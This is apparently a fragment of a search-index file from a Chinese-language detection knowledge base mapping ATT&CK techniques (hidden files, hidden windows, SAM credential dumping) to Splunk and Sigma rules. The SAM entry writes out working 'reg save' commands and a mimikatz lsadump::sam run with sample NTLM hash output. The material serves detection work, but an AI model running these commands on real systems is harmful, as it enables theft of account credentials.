sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_3","text":"Attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u8ba9\u6587\u4ef6\u5939\u5f7b\u5e95\u7684\u9690\u85cf\u8d77\u6765\uff0c\u5c31\u7b97\u662f\u5728\u6587\u4ef6\u5939\u9009\u9879\u4e2d\u8bbe\u7f6e\u4e86\u663e\u793a\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4e5f\u65e0\u6cd5\u663e\u793a\u51fa\u6765\u7684\u3002\u53ea\u80fd\u901a\u8fc7\u8def\u5f84\u8bbf\u95ee\u7684\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u5939\u3002 C:\\Users\\splaybow>help attrib \u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002 ATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [+I | -I] [drive:][path][filename] [/S [/D] [/L]] + \u8bbe\u7f6e\u5c5e\u6027\u3002 - \u6e05\u9664\u5c5e\u6027\u3002 R \u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u3002 A \u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3002 S \u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3002 H \u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 I \u65e0\u5185\u5bb9\u7d22\u5f15\u6587\u4ef6\u5c5e\u6027\u3002 [drive:][path][filename] \u6307\u5b9a attrib \u8981\u5904\u7406\u7684\u6587\u4ef6\u3002 /S \u5904\u7406\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5176\u6240\u6709\u5b50\u6587\u4ef6\u5939\u4e2d\u7684\u5339\u914d\u6587\u4ef6\u3002 /D \u4e5f\u5904\u7406\u6587\u4ef6\u5939\u3002 /L \u5904\u7406\u7b26\u53f7\u94fe\u63a5\u548c\u7b26\u53f7\u94fe\u63a5\u76ee\u6807\u7684\u5c5e\u6027\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_4","text":"windows sysmon/security","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_5","text":"\u76d1\u89c6\u6587\u4ef6\u7cfb\u7edf\u548cShell\u547d\u4ee4\uff0c\u4ee5\u67e5\u627e\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u3002\u548cWindows\u547d\u4ee4\u884c\u4f7f\u7528attrib.exe\u6dfb\u52a0\u9690\u85cf\u5c5e\u6027\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+s*\u201d) index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+h*\u201d)","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_7","text":"MITRE-ATT&CK-T1564-001 https://attack.mitre.org/techniques/T1564/001/ CMD\u4e2d\u4f7f\u7528attrib\u547d\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u53ea\u8bfb\u3001\u9690\u85cf\u5c5e\u6027\u8be6\u89e3 https://blog.csdn.net/whatday/article/details/52752555","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/","text":"T1564-003-windwos-\u9690\u85cf\u7a97\u53e3 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u9690\u85cf\u7684\u7a97\u53e3\u5c06\u6076\u610f\u6d3b\u52a8\u9690\u85cf\u5728\u7528\u6237\u7684\u89c6\u7ebf\u8303\u56f4\u4e4b\u5916\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u9690\u85cf\u901a\u5e38\u5728\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u64cd\u4f5c\u65f6\u663e\u793a\u7684\u7a97\u53e3\u3002\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u907f\u514d\u5728\u6267\u884c\u7ba1\u7406\u4efb\u52a1\u65f6\u7834\u574f\u5f53\u524d\u7528\u6237\u7684\u5de5\u4f5c\u73af\u5883\u3002 \u5728Windows\u4e0a\uff0cWindows\u4e2d\u7684\u811a\u672c\u8bed\u8a00\u5177\u6709\u591a\u79cd\u529f\u80fd\uff0c\u4f8b\u5982PowerShell\uff0cJscript\u548cVisual Basic\uff0c\u53ef\u4ee5\u9690\u85cf\u7a97\u53e3\u3002\u4e00\u4e2a\u5178\u578b\u793a\u4f8b\u5c31\u662fpowershell.exe -WindowStyle Hidden\u3002 \u540c\u6837\uff0c\u5728macOS\u4e0a\uff0c\u5c5e\u6027\u5217\u8868\uff08plist\uff09\u6587\u4ef6\u4e2d\u5217\u51fa\u4e86\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65b9\u5f0f\u7684\u914d\u7f6e\u3002\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u7684\u6807\u8bb0\u4e4b\u4e00\u53ef\u4ee5\u662fapple.awt.UIElement\uff0c\u5b83\u5141\u8bb8Java\u5e94\u7528\u7a0b\u5e8f\u963b\u6b62\u5e94\u7528\u7a0b\u5e8f\u7684\u56fe\u6807\u51fa\u73b0\u5728Dock\u4e2d\u3002\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u5f53\u5e94\u7528\u7a0b\u5e8f\u5728\u7cfb\u7edf\u6258\u76d8\u4e2d\u8fd0\u884c\u4f46\u53c8\u4e0d\u60f3\u663e\u793a\u5728Dock\u4e2d\u65f6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u4ee5\u5411\u7528\u6237\u9690\u85cf\u5176\u4ed6\u53ef\u89c1\u7684\u7a97\u53e3\uff0c\u4ece\u800c\u4e0d\u4f1a\u63d0\u9192\u7528\u6237\u7cfb\u7edf\u4e0a\u7684\u653b\u51fb\u8005\u6d3b\u52a8\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u6587\u7ae0\uff0c\u4f20\u9001\u95e8\uff1a https://zhuanlan.zhihu.com/p/25226349 \u68c0\u6d4b\u65e5\u5fd7 windows sysmon \u6d4b\u8bd5\u590d\u73b0 \u53ef\u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u4e2d\u76f8\u5173\u6587\u7ae0 \u6d4b\u8bd5\u7559\u75d5 windows sysmon \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u6709\u6307\u793a\u9690\u85cf\u7a97\u53e3\u7684\u64cd\u4f5c\u3002\u5728Windows\u4e2d\uff0c\u542f\u7528\u5e76\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u8bb0\u5f55\u548cPowerShell\u65e5\u5fd7\u8bb0\u5f55\u4ee5\u68c0\u67e5\u9690\u85cf\u7684\u7a97\u53e3\u6837\u5f0f\u3002\u5728MacOS\u4e2d\uff0cplist\u6587\u4ef6\u662f\u5177\u6709\u7279\u5b9a\u683c\u5f0f\u7684ASCII\u6587\u672c\u6587\u4ef6\uff0c\u56e0\u6b64\u5b83\u4eec\u76f8\u5bf9\u5bb9\u6613\u89e3\u6790\u3002\u6587\u4ef6\u76d1\u89c6\u53ef\u4ee5\u68c0\u67e5plist\u6587\u4ef6\u4e2d\u7684apple.awt.UIElement\u6216\u4efb\u4f55\u5176\u4ed6\u53ef\u7591\u7684plist\u6807\u8bb0\u5e76\u5bf9\u5176\u8fdb\u884c\u6807\u8bb0\u3002 splunk\u89c4\u5219 index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\powershell.exe\u201d CommandLine=\u201d*-WindowStyle Hidden*\u201d) \u5efa\u8bae \u5982\u4e0a\u68c0\u6d4b\u89c4\u5219\uff0c\u5b58\u5728\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u53ef\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u60c5\u51b5\uff0c\u4e0d\u65ad\u7684\u66f4\u65b0\u8981\u76d1\u89c6\u7684\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5f53\u7136powershell\u65e5\u5fd7\u4e5f\u53ef\u4ee5\u505a\u5230\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8bb0\u5f55\uff0c\u4e5f\u53ef\u901a\u8fc7powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1564-003 https://attack.mitre.org/techniques/T1564/003/ PowerShell \u5b89\u5168\u4e13\u9898\u4e4b\u653b\u51fb\u68c0\u6d4b\u7bc7 https://zhuanlan.zhihu.com/p/25226349","title":"T1564-003-windwos-\u9690\u85cf\u7a97\u53e3"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#t1564-003-windwos-","text":"","title":"T1564-003-windwos-\u9690\u85cf\u7a97\u53e3"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u9690\u85cf\u7684\u7a97\u53e3\u5c06\u6076\u610f\u6d3b\u52a8\u9690\u85cf\u5728\u7528\u6237\u7684\u89c6\u7ebf\u8303\u56f4\u4e4b\u5916\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u9690\u85cf\u901a\u5e38\u5728\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u64cd\u4f5c\u65f6\u663e\u793a\u7684\u7a97\u53e3\u3002\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u907f\u514d\u5728\u6267\u884c\u7ba1\u7406\u4efb\u52a1\u65f6\u7834\u574f\u5f53\u524d\u7528\u6237\u7684\u5de5\u4f5c\u73af\u5883\u3002 \u5728Windows\u4e0a\uff0cWindows\u4e2d\u7684\u811a\u672c\u8bed\u8a00\u5177\u6709\u591a\u79cd\u529f\u80fd\uff0c\u4f8b\u5982PowerShell\uff0cJscript\u548cVisual Basic\uff0c\u53ef\u4ee5\u9690\u85cf\u7a97\u53e3\u3002\u4e00\u4e2a\u5178\u578b\u793a\u4f8b\u5c31\u662fpowershell.exe -WindowStyle Hidden\u3002 \u540c\u6837\uff0c\u5728macOS\u4e0a\uff0c\u5c5e\u6027\u5217\u8868\uff08plist\uff09\u6587\u4ef6\u4e2d\u5217\u51fa\u4e86\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65b9\u5f0f\u7684\u914d\u7f6e\u3002\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u7684\u6807\u8bb0\u4e4b\u4e00\u53ef\u4ee5\u662fapple.awt.UIElement\uff0c\u5b83\u5141\u8bb8Java\u5e94\u7528\u7a0b\u5e8f\u963b\u6b62\u5e94\u7528\u7a0b\u5e8f\u7684\u56fe\u6807\u51fa\u73b0\u5728Dock\u4e2d\u3002\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u5f53\u5e94\u7528\u7a0b\u5e8f\u5728\u7cfb\u7edf\u6258\u76d8\u4e2d\u8fd0\u884c\u4f46\u53c8\u4e0d\u60f3\u663e\u793a\u5728Dock\u4e2d\u65f6\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u4ee5\u5411\u7528\u6237\u9690\u85cf\u5176\u4ed6\u53ef\u89c1\u7684\u7a97\u53e3\uff0c\u4ece\u800c\u4e0d\u4f1a\u63d0\u9192\u7528\u6237\u7cfb\u7edf\u4e0a\u7684\u653b\u51fb\u8005\u6d3b\u52a8\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_1","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u6587\u7ae0\uff0c\u4f20\u9001\u95e8\uff1a https://zhuanlan.zhihu.com/p/25226349","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_2","text":"windows sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_3","text":"\u53ef\u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u4e2d\u76f8\u5173\u6587\u7ae0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_4","text":"windows sysmon","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_5","text":"\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u6709\u6307\u793a\u9690\u85cf\u7a97\u53e3\u7684\u64cd\u4f5c\u3002\u5728Windows\u4e2d\uff0c\u542f\u7528\u5e76\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u8bb0\u5f55\u548cPowerShell\u65e5\u5fd7\u8bb0\u5f55\u4ee5\u68c0\u67e5\u9690\u85cf\u7684\u7a97\u53e3\u6837\u5f0f\u3002\u5728MacOS\u4e2d\uff0cplist\u6587\u4ef6\u662f\u5177\u6709\u7279\u5b9a\u683c\u5f0f\u7684ASCII\u6587\u672c\u6587\u4ef6\uff0c\u56e0\u6b64\u5b83\u4eec\u76f8\u5bf9\u5bb9\u6613\u89e3\u6790\u3002\u6587\u4ef6\u76d1\u89c6\u53ef\u4ee5\u68c0\u67e5plist\u6587\u4ef6\u4e2d\u7684apple.awt.UIElement\u6216\u4efb\u4f55\u5176\u4ed6\u53ef\u7591\u7684plist\u6807\u8bb0\u5e76\u5bf9\u5176\u8fdb\u884c\u6807\u8bb0\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\powershell.exe\u201d CommandLine=\u201d*-WindowStyle Hidden*\u201d)","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_6","text":"\u5982\u4e0a\u68c0\u6d4b\u89c4\u5219\uff0c\u5b58\u5728\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u53ef\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u60c5\u51b5\uff0c\u4e0d\u65ad\u7684\u66f4\u65b0\u8981\u76d1\u89c6\u7684\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5f53\u7136powershell\u65e5\u5fd7\u4e5f\u53ef\u4ee5\u505a\u5230\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8bb0\u5f55\uff0c\u4e5f\u53ef\u901a\u8fc7powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_7","text":"MITRE-ATT&CK-T1564-003 https://attack.mitre.org/techniques/T1564/003/ PowerShell \u5b89\u5168\u4e13\u9898\u4e4b\u653b\u51fb\u68c0\u6d4b\u7bc7 https://zhuanlan.zhihu.com/p/25226349","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-002--windows-\u57fa\u4e8eSAM-reg\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002 SAM\uff08Security Accounts Manager\uff09 SAM\u6587\u4ef6\u662f\u4e00\u4e2a\u5b58\u50a8\u4e3b\u673a\u672c\u5730\u8d26\u6237\u4fe1\u606f\u7684\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u901a\u5e38\u662f\"net user\"\u80fd\u770b\u5230\u7684\u7528\u6237\u3002\u60f3\u8981\u679a\u4e3eSAM\u6570\u636e\u5e93\uff0c\u4f60\u9700\u8981\u7cfb\u7edf\uff08system\uff09\u6743\u9650\u624d\u80fd\u591f\u8fdb\u884c\u64cd\u4f5c\u3002\u5b83\u53ef\u4ee5\u5728\u4e24\u79cd\u6a21\u5f0f\u4e0b\u5de5\u4f5c\uff1a\u5728\u7ebf\uff08\u4f7f\u7528SYSTEM\u7528\u6237\u6216\u4ee4\u724c\uff09\u6216\u79bb\u7ebf\uff08\u4f7f\u7528SYSTEM\uff06SAMhives\u6216backup\uff09\u3002 \u5b89\u5168\u5e10\u6237\u7ba1\u7406\u5668\uff08SAM\uff09\uff0c\u5f80\u5f80\u662f\u4e00\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\u5728Windows XP\u4e2d\uff0cWindows Vista\u4e2d\u3001Windows 7\u4e2d\u30018.1\u548c10\u5b58\u50a8\u7528\u6237\u7684\u5bc6\u7801\u3002\u5b83\u53ef\u7528\u4e8e\u9a8c\u8bc1\u672c\u5730\u548c\u8fdc\u7a0b\u7528\u6237\u3002\u4eceWindows 2000 SP4\u5f00\u59cb\uff0cActive Directory\u5bf9\u8fdc\u7a0b\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002SAM\u4f7f\u7528\u52a0\u5bc6\u63aa\u65bd\u6765\u9632\u6b62\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u8bbf\u95ee\u7cfb\u7edf\u3002 \u7528\u6237\u5bc6\u7801\u4ee5\u6563\u5217\u683c\u5f0f\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\uff0c\u53ef\u4ee5\u662fLM\u54c8\u5e0c\uff0c\u4e5f\u53ef\u4ee5\u662fNTLM\u54c8\u5e0c\u3002\u53ef\u4ee5\u5728\u6b64\u6587\u4ef6\u4e2d\u627e\u5230%SystemRoot%/system32/config/SAM\u5e76\u5b89\u88c5\u6b64\u6587\u4ef6HKLM/SAM\u3002LM\u54c8\u5e0c\u662f\u4e00\u79cd\u53d7\u635f\u7684\u534f\u8bae\uff0c\u5df2\u88abNTLM\u54c8\u5e0c\u53d6\u4ee3\u3002\u53ef\u4ee5\u5c06\u5927\u591a\u6570Windows\u7248\u672c\u914d\u7f6e\u4e3a\u5728\u7528\u6237\u66f4\u6539\u5bc6\u7801\u65f6\u7981\u7528\u6709\u6548LM\u54c8\u5e0c\u7684\u521b\u5efa\u548c\u5b58\u50a8\u3002Windows Vista\u548c\u66f4\u9ad8\u7248\u672c\u7684Windows\u9ed8\u8ba4\u7981\u7528LM\u54c8\u5e0c\u3002 \u4e3a\u4e86\u63d0\u9ad8SAM\u6570\u636e\u5e93\u7684\u5b89\u5168\u6027\u4ee5\u9632\u6b62\u8131\u673a\u79bb\u7ebf\u7834\u89e3\uff0cMicrosoft\u5728Windows NT 4.0\u4e2d\u5f15\u5165\u4e86SYSKEY\u529f\u80fd\u3002\u542f\u7528SYSKEY\u540e\uff0cSAM\u6587\u4ef6\u7684\u78c1\u76d8\u526f\u672c\u5c06\u90e8\u5206\u52a0\u5bc6\uff0c\u4ee5\u4fbfSAM\u4e2d\u5b58\u50a8\u7684\u6240\u6709\u672c\u5730\u5e10\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u90fd\u4f7f\u7528\u5bc6\u94a5\u52a0\u5bc6\uff08\u901a\u5e38\u4e5f\u79f0\u4e3a\u201cSYSKEY\u201d\uff09\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c\u7a0b\u5e8f\u542f\u7528\u5b83\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a pwdump.exe Mimikatz gsecdump \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528Reg\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6SAM\u6587\u4ef6\u4fe1\u606f\uff1a reg save HKLM\\SYSTEM SystemBkup.hiv reg save HKLM\\SAM SamBkup.hiv \u7136\u540e\u53ef\u4ee5\u4f7f\u7528Creddump7\u6216\u8005hashcat\u5728\u672c\u5730\u79bb\u7ebf\u63d0\u53d6\u54c8\u5e0c\u503c\u3002 \u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u5907\u4efd\u8fd9\u4e9b\u6587\u4ef6\uff1a C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aRid 500\u8d26\u6237\u662f\u672c\u5730\u5185\u7f6e\u8d26\u6237\uff0cRid 501\u662f\u6765\u5bbe\u7528\u6237\uff0c\u7528\u6237\u8d26\u6237\u4ee5Rid 1000+\u5f00\u5934\u3002 \u68c0\u6d4b\u65e5\u5fd7 sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator) C:\\Users\\me\\Desktop>reg save hklm\\sam sam.hiv The operation completed successfully. C:\\Users\\me\\Desktop>reg save hklm\\system system.hiv The operation completed successfully. mimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003eb (1003) User : test Hash NTLM: a2345375a47a92754e2505132aca194b RID : 000003ec (1004) User : test2 Hash NTLM: f0873f3268072c7b1150b15670291137 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 \u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)\u00b7 title: \u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator) description: windows 7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump tags: ATT&CK T1003-002 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: sysmon detection: \u200b selection1: \u200b EventID: 1 \u200b Image: 'C:\\Windows\\System32\\reg.exe' \u200b CommandLine: 'reg save hklm\\sam *.hiv' \u200b selection2: \u200b EventID: 1 \u200b Image: 'Image: C:\\Windows\\System32\\reg.exe' \u200b CommandLine: 'reg save hklm\\system *.hiv' \u200b timeframe: last 2m \u200b condition: all of them level: high \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-002 https://attack.mitre.org/techniques/T1003/002 pwdump7 http://passwords.openwall.net/b/pwdump/pwdump7.zip powershell https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 mimikatz wiki https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump \u5173\u4e8e\u66f4\u591a\u901a\u8fc7SAM\u6570\u636e\u5e93\u83b7\u53d6\u672c\u5730\u7528\u6237hash\u4f60\u4e5f\u53ef\u4ee5\u53c2\u8003 https://www.4hou.com/technology/10878.html","title":"T1003-002--windows-\u57fa\u4e8eSAM-reg\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-002-windows-sam-reg","text":"","title":"T1003-002--windows-\u57fa\u4e8eSAM-reg\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#samsecurity-accounts-manager","text":"SAM\u6587\u4ef6\u662f\u4e00\u4e2a\u5b58\u50a8\u4e3b\u673a\u672c\u5730\u8d26\u6237\u4fe1\u606f\u7684\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u901a\u5e38\u662f\"net user\"\u80fd\u770b\u5230\u7684\u7528\u6237\u3002\u60f3\u8981\u679a\u4e3eSAM\u6570\u636e\u5e93\uff0c\u4f60\u9700\u8981\u7cfb\u7edf\uff08system\uff09\u6743\u9650\u624d\u80fd\u591f\u8fdb\u884c\u64cd\u4f5c\u3002\u5b83\u53ef\u4ee5\u5728\u4e24\u79cd\u6a21\u5f0f\u4e0b\u5de5\u4f5c\uff1a\u5728\u7ebf\uff08\u4f7f\u7528SYSTEM\u7528\u6237\u6216\u4ee4\u724c\uff09\u6216\u79bb\u7ebf\uff08\u4f7f\u7528SYSTEM\uff06SAMhives\u6216backup\uff09\u3002 